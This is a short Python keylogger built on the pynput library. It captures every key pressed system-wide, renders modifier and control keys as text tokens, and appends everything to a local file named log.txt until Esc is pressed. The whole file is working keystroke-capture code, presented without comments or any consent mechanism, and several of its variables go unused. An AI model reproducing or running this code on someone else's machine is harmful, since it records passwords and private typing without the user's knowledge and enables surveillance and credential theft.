import pynput
import textwrap
from pynput.keyboard import Key, Listener


k=[]

full_log=20
word=''


def on_press(key):
   global word
   global full_log
   key=str(key)
   if key =='Key.esc':
      raise SystemExit(0)
   key=key.replace("'","")
   if key == "Key.space":
      key=" "   
   elif key == "Key.enter":
      key="\n"
   elif key == "Key.shift_l":
      key=".shift-l."
   elif key == "Key.shift_r":
      key=".shift-r."
   elif key == "Key.ctrl_l":
      key=".ctrl-l."
   elif key == "Key.ctrl_r":
      key=".ctrl-r."
   elif key == "Key.alt_l":
      key=".alt-l."
   elif key == "Key.alt_r":
      key=".alt-r."
   elif key == "Key.backspace":
      key= ".backspace."
   elif key == "Key.tab":
      key=".tab."
   elif key == "Key.caps_lock":
      key=".caps."
      
   f=open('log.txt','a',encoding='utf-8')
   f.write(textwrap.fill(key, width = 10))
   f.close()
   
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()